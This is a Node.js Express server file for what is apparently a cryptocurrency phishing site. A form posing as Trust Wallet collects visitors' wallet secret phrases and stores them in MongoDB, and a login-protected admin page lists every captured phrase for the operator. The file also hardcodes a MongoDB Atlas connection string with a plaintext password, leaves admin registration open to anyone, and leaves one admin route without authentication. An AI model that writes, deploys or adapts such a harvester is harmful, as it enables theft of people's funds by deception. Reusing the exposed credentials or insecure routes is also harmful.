const express = require("express");
const app = express();

const bodyParser = require("body-parser");
const path = require("path");
const alert = require("alert");
const ejs = require("ejs");
const passport = require("passport");
const LocalStrategy = require("passport-local");
const methodOverride = require("method-override");

// const  {serializeUser}  = require("passport");

//connecting to mongodb locally
 
const mongoose = require("mongoose");

mongoose.connect("mongodb://localhost/MINT", {useNewUrlParser: true, useUnifiedTopology: true}, function(err){
    if(err){
        console.log(err)
    }
    else{
        console.log("database connected successfully");
    }
});

//conecting to mongodb cloud online

const { MongoClient, ServerApiVersion } = require('mongodb');
const uri = "mongodb+srv://adedokun:adedokun@cluster0.dvnvi.mongodb.net/PEA?retryWrites=true&w=majority";
// const client = new MongoClient(uri, { useNewUrlParser: true, useUnifiedTopology: true, serverApi: ServerApiVersion.v1 });
// client.connect(err => {
//   const collection = client.db("test").collection("devices");
//   // perform actions on the collection object
//   client.close();
// });

// mongoose.connect(uri, {useNewUrlParser: true, useUnifiedTopology: true}, function(err){
//     if(err){
//         console.log(err)
//     }
//     else{
//         console.log("database connected successfully");
//     }
// });






// importing wallets databse
const Trustwallet = require("./model/Trustwallet")

//importing users database
const User = require("./model/user");



app.use(methodOverride("_method"));
app.use(express.static(path.join(__dirname + "/public/")));
app.use(bodyParser.urlencoded({extended: true}));


// configuring passport
app.use(require("express-session")({
    secret: "building an wallet connecting app",
    resave: false,
    saveUninitialized: false
}))

app.use(passport.initialize());
app.use(passport.session());
passport.serializeUser(User.serializeUser());
passport.deserializeUser(User.deserializeUser());
passport.use( new LocalStrategy(User.authenticate()));

app.use(function(req, res, next){
    res.locals.currentUser = req.user;
    next();
});


app.set("view engine", "ejs"); 


app.get("/", function(req, res){
    res.render("index");
})

app.get("/trustwallet", function(req, res){
    res.render("Trustwallet");
})



app.post("/trustwallet", function(req, res){
    const Key = {
        name: req.body.name,
        wallet: req.body.wallet
    }
    Trustwallet.create(Key,  function(err, key){
        if(err){
            console.log(err)
        }
        else{
            console.log("Trust wallet secret phrase imported successfully");
            res.redirect("/")
        }
    })
})

// rendering general admin page
app.get("/admin", isLoggedIn, function(req, res){
    Trustwallet.find({}, function(err, keys){
        if(err){
            console.log(err);
        }
        else{
            res.render("Admin/index", {keys:keys});
        }
    })
})

// routes to login form
app.get("/admin/register", function(req, res){
    res.render("admin/register");
})


// routes for admin to create account
app.post("/admin/register", function(req, res){
    const newUser = new User (
        {
            username: req.body.username,
    })
    User.register(newUser, req.body.password, function(err, register){
        if(err){
            console.log(err);
            res.redirect("back");
        }
        else{
            console.log("account created successfully")
            passport.authenticate("local")(req, res, function(){
            res.redirect("/admin");
            })
        }
    })
})

// routes to login form
app.get("/admin/login", function(req, res){
    res.render("admin/login");
})

//routes to login 
app.post("/admin/login", passport.authenticate("local", 
{
    successRedirect: "/admin",
    failureRedirect: "/admin/login"
}), function(req, res){ 
 
})

//routes to logout
app.get("/admin/logout", function(req, res){
    req.logout();
    res.redirect("/admin/login");
})

//must login function
function isLoggedIn(req, res, next){
    if(req.isAuthenticated()){
        return next();
    }
    else{
        res.redirect("/admin/login");
    }
}


//routes for admin user details
app.get("/admin/:id", function(req, res){
    User.findById(req.params.id, function(err, foundUser){
        if(err){
            console.log(err);
            res.redirect("back");
        }
        else{
            res.render("/admin/index", {foundUser:foundUser});
        }
    })
    
})


app.listen(1010, function(){
    console.log("happy hacking!!!");
})